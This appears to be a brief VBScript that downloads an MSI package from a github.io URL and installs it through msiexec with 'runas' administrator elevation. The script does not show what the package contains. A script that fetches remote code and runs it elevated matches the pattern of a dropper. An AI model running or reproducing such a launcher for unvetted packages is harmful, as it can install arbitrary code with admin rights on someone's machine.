Dim objShellApp, msiPath

' Specify the full path or URL to your MSI installer file
msiPath = "https://pc1n.github.io/scnv2-5m/scn5mdec.msi"

' Create the Shell Application object required for elevated execution
Set objShellApp = CreateObject("Shell.Application")

' Execute msiexec with administrative elevation ("runas")
' Arguments: "msiexec.exe", Parameters, Directory, Verb, ShowWindow
objShellApp.ShellExecute "msiexec.exe", "/i """ & msiPath & """ /qb!", "", "runas", 1

' Clean up
Set objShellApp = Nothing
